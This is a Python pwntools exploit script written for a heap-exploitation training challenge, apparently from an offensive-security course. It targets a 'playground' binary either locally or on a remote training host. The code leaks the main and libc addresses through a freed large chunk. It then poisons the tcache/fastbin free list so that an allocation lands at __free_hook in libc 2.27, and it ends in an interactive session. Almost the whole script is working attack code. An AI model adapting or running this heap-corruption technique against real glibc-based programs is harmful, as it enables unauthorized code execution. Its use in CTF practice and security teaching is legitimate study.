from pwn import *
import time
import subprocess
from functools import reduce

def bytes2int(data):
	return int(data, 16)

def int2bytes(num: int, adjust=8) -> bytes:
	return num.to_bytes((num.bit_length() + 7) // 8, byteorder='little', signed=True if num < 0 else False).ljust(adjust, b"\x00")

def any2bytes(datum, adjust=8):
	if isinstance(datum, str):
		return datum.encode()
	elif isinstance(datum, int):
		return int2bytes(datum, adjust)
	elif isinstance(datum, bytes):
		return datum
	else:
		raise TypeError("any2bytes: datum provided is neither str, int or bytes object")

def send(r, data):
	result=b""
	if isinstance(data, list):
		for datum in data:
			result += any2bytes(datum)
	else:
		result = any2bytes(data)
	r.sendline(result)
	time.sleep(0.05)

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
	exit(-1)

def rop_chain(chain):	
	for i in range(len(chain)):
		chain[i] = p64(chain[i])
	return reduce(lambda x, y: x + y, chain)

def fill_tcache(r, chunk_size=0x20):
	as_tcache = [alloc(r, chunk_size) for i in range(7)]
	alloc(r, 0x10) #coalescing
	for a_chunk in as_tcache:
		free(r, a_chunk)

def get_a_main(r):
	r.recvuntil(b"main: ")
	return bytes2int(r.recvline(keepends=False))

def alloc(r, size):
	r.clean()
	send(r, ["malloc ", str(size)])
	r.recvuntil(b"==> ")
	return bytes2int(r.recvline(keepends=False))

# frees a chunk at address a_chunk
def free(r, a_chunk):
	r.clean()
	send(r, ["free ", str(a_chunk)])
	r.recvuntil(b"==> ok")

#prints to output n bytes starting from a address
def show(r, a, n):
	r.clean()
	send(r, "show " + str(a) + " " + str(n))

def get_leak_libc(r):
	r.recvuntil(b":")
	r.recvuntil(b"0x")
	r.unrecv(b"0x")
	return bytes2int(r.recvline(keepends=False))

#it does string size+1 caus it accounts also for the \n character
def write(r, a, data, size):
	r.clean()
	send(r, "write " + str(a) + " " + str(size+1))
	r.recvline()
	send(r, data)
	r.recvuntil(b"==> done")

#I/O functions

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "warn"
logging.getLogger('pwnlib.elf').setLevel(logging.ERROR)

# breakpoints
b_main = 0xffff

one_gadget=0x00
if args["ONE_GADGET"]:
	one_gadget = int(args["ONE_GADGET"], 16)
if args["REMOTE"]:
	r = remote("in.training.offdef.it", 4110)
else:
	r = process("./playground")
	if args["GDB"]:
		gdb.attach(r, f"""
		# b *{b_main}
		unset env
		set disable-randomization off
		set debuginfod enabled on
		c
		""")
		input("wait")

LIBC = ELF("./libc-2.27.so")
#LIBC.symbols["__symol_name"]


time.sleep(0.5)

a_main = get_a_main(r)
print("leak main: ", hex(a_main))

#LEAK LIBC
a_heap = alloc(r, 0x600)
print("leak heap:", hex(a_heap))
alloc(r, 0x10)						# no coalescing
free(r, a_heap)
show(r, a_heap, 1)
LIBC.address = get_leak_libc(r) - 0x3ebca0
print("leak libc", hex(LIBC.address))

#FASTBIN ATTACK

a = alloc(r, 0x20)
free(r, a)
write(r, a, LIBC.symbols["__free_hook"] - 0x10, len(str(LIBC.symbols["__free_hook"] - 0x10)))
alloc(r, 0x20)
alloc(r, 0x20)
input("wait")

r.interactive()
